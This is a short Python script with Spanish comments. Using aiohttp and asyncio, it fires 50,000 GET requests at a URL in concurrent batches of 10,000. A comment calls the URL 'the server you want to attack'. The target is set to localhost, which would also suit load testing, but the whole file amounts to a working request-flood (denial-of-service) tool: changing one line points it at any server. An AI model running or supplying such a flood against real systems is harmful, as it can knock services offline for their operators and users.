import aiohttp
import asyncio

# URL del servidor que deseas atacar
url = "http://localhost:3000/"

# Número total de peticiones
total_requests = 50000
concurrent_requests = 10000  # Número de peticiones concurrentes

async def send_request(session):
    try:
        async with session.get(url) as response:
            print(f"Status Code: {response.status}")
    except Exception as e:
        print(f"Error: {e}")

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session) for _ in range(total_requests)]
        # Ejecutar las peticiones en lotes concurrentes
        for i in range(0, total_requests, concurrent_requests):
            await asyncio.gather(*tasks[i:i+concurrent_requests])

if __name__ == "__main__":
    asyncio.run(main())
